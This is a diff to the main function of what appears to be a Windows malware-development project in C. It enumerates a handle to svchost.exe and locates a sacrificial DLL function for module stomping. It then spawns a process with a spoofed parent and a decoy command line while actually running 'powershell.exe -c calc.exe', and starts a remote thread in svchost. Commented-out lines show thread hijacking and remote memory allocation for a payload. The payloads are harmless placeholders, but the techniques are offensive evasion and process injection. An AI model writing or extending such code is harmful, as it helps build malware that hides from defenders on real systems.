@@ -11,7 +11,7 @@ int main()
 	PVOID pExPayload, pStompingTarget = NULL;
 	LPWSTR TargetProcessName = L"svchost.exe";
 	LPSTR  pTargetProcessName = "RuntimeBroker.exe";
-	//if(!FetchLocalAllertableThread(GetCurrentThreadId(), &dwThreadId, &hThread)) return -2;
+	//if(!FetchLocalAlertableThread(GetCurrentThreadId(), &dwThreadId, &hThread)) return -2;
 	EnumRemoteProcessHandle(TargetProcessName, &dwPID0, &hProcess);
 
 	FetchStompingTarget(SACRIFICIAL_DLL, SACRIFICIAL_FUNC, &pStompingTarget);
@@ -114,11 +114,17 @@ int main()
 	//UnmapViewOfFile(pObfInput);
 
 	//HijackThread(hThread, pStompingTarget);
-	SpoofParentProcessId(pTargetProcessName, hProcess, &dwPID1, &hProcess1, &dwThreadId, &hThread);
+	
+	SpoofParentProcessId2(L"PowerShell.exe Totally Normal & Administratively Command Line Argurmnt", L"powershell.exe -c calc.exe", &hProcess1, &dwPID1 , &dwThreadId);
+
 	hThread1 = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxA, NULL, NULL, &dwThreadId);
+
 	CloseHandle(hProcess);
+
 	if(!hThread1) WaitForSingleObject(hThread1, INFINITE);
+
 	printf("Parent Process PID %lu Child Process PID %lu\n", dwPID0, dwPID1);
+	
 	//hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExtPayloadAddres, NULL, NULL, &dwThreadId);
 
 	//if (!(pExPayload = VirtualAllocEx(hProcess1, 0, pPayload_t.sText,MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) return -7;
